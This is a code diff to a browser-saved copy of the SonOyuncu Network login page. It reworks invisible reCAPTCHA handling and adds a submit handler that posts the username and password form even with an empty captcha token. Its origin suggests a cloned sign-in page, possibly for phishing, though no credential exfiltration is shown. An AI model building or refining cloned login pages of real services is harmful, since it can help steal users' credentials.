@@ -61,20 +61,27 @@ function biscolabLaravelReCaptcha(token) {
     </script>
 <link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit"></script>
 <script>
-      var onloadCallback = function() {
-        grecaptcha.render("g-recaptcha-btn", {
-          "sitekey" : "6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ",
-          "size" : "invisible",
-          "badge": "bottomright",
-          "callback" : onSubmit
-        });
-      };
+      
+var recaptchaWidgetId = null;
+var onloadCallback = function() {
+  try {
+    recaptchaWidgetId = grecaptcha.render("recaptcha-container", {
+      "sitekey": "6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ",
+      "size": "invisible",
+      "badge": "bottomright",
+      "callback": biscolabLaravelReCaptcha
+    });
+  } catch(e) {
+    console.error("reCAPTCHA render error:", e);
+  }
+};
+
     </script>
 <script>
 function biscolabLaravelReCaptcha(token) {
   document.getElementById("biscolab-recaptcha-invisible-form").submit();
 }
-</script><script async="" defer="" src="https://www.google.com/recaptcha/api.js"></script><style>
+</script><style>
 .grecaptcha-badge {
   visibility: visible !important;
   opacity: 1 !important;
@@ -151,7 +158,7 @@ function biscolabLaravelReCaptcha(token) {
 </div>
 <div class="flex justify-between items-center">
 <div class="w-1/2">
-<div><div class="grecaptcha-error"></div><textarea class="g-recaptcha-response" id="g-recaptcha-response" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe src="./Giriş Yap ve Hemen Oyna - SonOyuncu Network_files/saved_resource(1).html" style="display: none;"></iframe></div><button class="w-full block text-sm bg-orange-500 hover:bg-orange-600 text-white font-bold py-2 px-4 rounded focus:outline-none cursor-pointer focus:shadow-outline g-recaptcha" data-badge="bottomright" data-callback="biscolabLaravelReCaptcha" data-sitekey="6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ" id="g-recaptcha-btn">
+<div><div class="grecaptcha-error"></div><textarea class="g-recaptcha-response" id="g-recaptcha-response" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe src="./Giriş Yap ve Hemen Oyna - SonOyuncu Network_files/saved_resource(1).html" style="display: none;"></iframe></div><button class="w-full block text-sm bg-orange-500 hover:bg-orange-600 text-white font-bold py-2 px-4 rounded focus:outline-none cursor-pointer focus:shadow-outline g-recaptcha" data-badge="bottomright" data-callback="biscolabLaravelReCaptcha" data-sitekey="6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ" id="g-recaptcha-btn" type="submit">
               Giriş Yap
             </button>
 </div>
@@ -209,5 +216,28 @@ function onSubmit(token) {
   <input type="text" name="username">
   <input type="password" name="password">
 </form>
+
+<div id="recaptcha-container" style="display:none;"></div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function(){
+  var form = document.getElementById("biscolab-recaptcha-invisible-form");
+  if (!form) return;
+  form.addEventListener("submit", function(ev){
+    ev.preventDefault();
+    try {
+      if (window.grecaptcha && recaptchaWidgetId !== null) {
+        grecaptcha.execute(recaptchaWidgetId);
+      } else {
+        // fallback: go straight to AJAX submit without token
+        biscolabLaravelReCaptcha("");
+      }
+    } catch(e){
+      console.error("Submit guard error:", e);
+      biscolabLaravelReCaptcha("");
+    }
+  });
+});
+</script>
 
 </body></html>
